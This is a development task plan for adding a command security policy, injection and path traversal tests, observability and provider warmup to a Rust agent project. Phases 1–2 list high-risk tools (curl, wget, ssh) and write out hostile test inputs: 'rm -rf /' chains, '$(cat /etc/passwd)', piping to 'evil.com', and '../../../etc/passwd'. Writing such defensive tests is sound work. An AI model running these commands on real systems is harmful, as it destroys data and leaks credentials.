# Tasks: Enhance Security and Observability

## Phase 1: Security Policy Foundation

### Task 1.1: Create Security Module Structure
- [ ] Create `nanobot-core/src/security/mod.rs`
- [ ] Create `nanobot-core/src/security/policy.rs`
- [ ] Create `nanobot-core/src/security/tracker.rs`
- [ ] Add module to `nanobot-core/src/lib.rs`
- **Validation**: `cargo check` passes

### Task 1.2: Implement CommandRisk Enum
- [ ] Define `CommandRisk` enum with `Low`, `Medium`, `High` variants
- [ ] Implement `classify_command()` method
- [ ] Add high-risk command list (rm, sudo, curl, wget, ssh, etc.)
- [ ] Add medium-risk command detection (git push, npm install, etc.)
- [ ] Handle command chaining (&&, ||, ;, |)
- **Validation**: Unit tests pass for all risk levels

### Task 1.3: Implement SecurityPolicy Struct
- [ ] Define `SecurityPolicy` with all configuration fields
- [ ] Implement `Default` trait with safe defaults
- [ ] Implement `is_command_allowed()` with injection detection
- [ ] Implement `validate_execution()` with approval flow
- [ ] Implement `is_path_allowed()` with traversal detection
- **Validation**: Unit tests for each method

### Task 1.4: Implement ActionTracker
- [ ] Create `ActionTracker` with sliding window
- [ ] Implement `record()` method
- [ ] Implement `is_limited()` method
- [ ] Handle concurrent access with `Mutex`
- **Validation**: Rate limiting tests pass

### Task 1.5: Update Configuration Schema
- [ ] Add `SecurityConfig` to `config/schema.rs`
- [ ] Add `security` field to root `Config`
- [ ] Implement `Default` with safe defaults
- [ ] Add deserialization with camelCase aliases
- **Validation**: Config parsing tests pass

### Task 1.6: Integrate SecurityPolicy with ExecTool
- [ ] Add `SecurityPolicy` reference to `ExecTool`
- [ ] Update `execute()` to validate commands
- [ ] Update `execute()` to check rate limits
- [ ] Maintain backward compatibility with `enabled` flag
- **Validation**: ExecTool tests pass

---

## Phase 2: Security Test Suite

### Task 2.1: Create Security Tests Module
- [ ] Create `nanobot-core/tests/security_tests.rs`
- [ ] Set up test fixtures and helpers
- **Validation**: Test file compiles

### Task 2.2: Command Injection Tests
- [ ] Test semicolon injection: `ls; rm -rf /`
- [ ] Test backtick injection: `echo \`whoami\``
- [ ] Test `$()` injection: `echo $(cat /etc/passwd)`
- [ ] Test `${}` injection: `echo ${IFS}cat`
- [ ] Test pipe chain: `ls | curl evil.com`
- [ ] Test AND chain: `ls && rm -rf /`
- [ ] Test OR chain: `ls || rm -rf /`
- [ ] Test newline injection: `ls\nrm -rf /`
- [ ] Test redirect injection: `echo x > /etc/passwd`
- **Validation**: All injection attempts blocked

### Task 2.3: Path Traversal Tests
- [ ] Test relative traversal: `../../../etc/passwd`
- [ ] Test URL-encoded traversal: `..%2f..%2fetc`
- [ ] Test null byte injection: `file\0.txt`
- [ ] Test symlink escape detection
- [ ] Test workspace boundary enforcement
- **Validation**: All traversal attempts blocked

### Task 2.4: Rate Limiting Tests
- [ ] Test actions within limit
- [ ] Test actions over limit
- [ ] Test exact boundary
- [ ] Test zero limit
- [ ] Test sliding window expiration
- **Validation**: Rate limiting behavior verified

### Task 2.5: Configuration Validation Tests
- [ ] Test default values are safe
- [ ] Test invalid config rejection
- [ ] Test autonomy level serialization
- **Validation**: Config tests pass

---

## Phase 3: Observability System

### Task 3.1: Create Observability Module
- [ ] Create `nanobot-core/src/observability/mod.rs`
- [ ] Add module to `nanobot-core/src/lib.rs`
- **Validation**: Module compiles

### Task 3.2: Define Observer Trait
- [ ] Define `Observer` trait with `record()` method
- [ ] Define `ObserverEvent` enum with all event types
- [ ] Define `MessageDirection` enum
- **Validation**: Trait compiles

### Task 3.3: Implement NoopObserver
- [ ] Create `NoopObserver` struct
- [ ] Implement `Observer` trait (no-op)
- **Validation**: Zero overhead verified

### Task 3.4: Implement LogObserver
- [ ] Create `LogObserver` struct with level field
- [ ] Implement `Observer` trait with tracing
- [ ] Format events for readability
- **Validation**: Logs appear in test output

### Task 3.5: Create Observer Factory
- [ ] Create `create_observer()` factory function
- [ ] Add `ObservabilityConfig` to schema
- [ ] Wire up factory in agent initialization
- **Validation**: Correct observer created from config

### Task 3.6: Integrate Observer in Agent Loop
- [ ] Record `AgentStart` event
- [ ] Record `AgentEnd` event
- [ ] Record `ToolCall` events
- [ ] Record `SecurityEvent` events
- **Validation**: Events logged during agent run

---

## Phase 4: Provider Warmup

### Task 4.1: Extend LlmProvider Trait
- [ ] Add `async fn warmup() -> Result<()>` with default impl
- [ ] Update trait documentation
- **Validation**: Trait compiles

### Task 4.2: Implement Warmup in OpenAICompatibleProvider
- [ ] Implement `warmup()` with minimal request
- [ ] Handle warmup errors gracefully
- **Validation**: Warmup reduces first request latency

### Task 4.3: Call Warmup on Provider Creation
- [ ] Add warmup call in provider factory
- [ ] Make warmup optional (config flag)
- **Validation**: Warmup executed on startup

---

## Phase 5: Integration and Documentation

### Task 5.1: End-to-End Integration Test
- [ ] Create integration test with all new features
- [ ] Test security policy enforcement
- [ ] Test observability event recording
- [ ] Test rate limiting in real scenario
- **Validation**: Integration test passes

### Task 5.2: Update Configuration Documentation
- [ ] Document `security` config section
- [ ] Document `observability` config section
- [ ] Add configuration examples
- **Validation**: Docs reviewed

### Task 5.3: Add Migration Guide
- [ ] Document breaking changes
- [ ] Provide config migration examples
- **Validation**: Guide reviewed

---

## Parallelization Opportunities

| Parallel Group | Tasks |
|----------------|-------|
| A (Can run in parallel) | 1.1, 3.1 |
| B (Depends on A) | 1.2, 1.3, 1.4, 3.2, 3.3, 4.1 |
| C (Depends on B) | 1.5, 1.6, 2.1, 3.4, 3.5, 4.2, 4.3 |
| D (Depends on C) | 2.2, 2.3, 2.4, 2.5, 3.6 |
| E (Final) | 5.1, 5.2, 5.3 |

## Estimated Effort

| Phase | Tasks | Estimated Days |
|-------|-------|----------------|
| Phase 1 | Security Policy | 2-3 days |
| Phase 2 | Security Tests | 1-2 days |
| Phase 3 | Observability | 1-2 days |
| Phase 4 | Provider Warmup | 0.5 day |
| Phase 5 | Integration | 0.5-1 day |
| **Total** | | **5-8 days** |
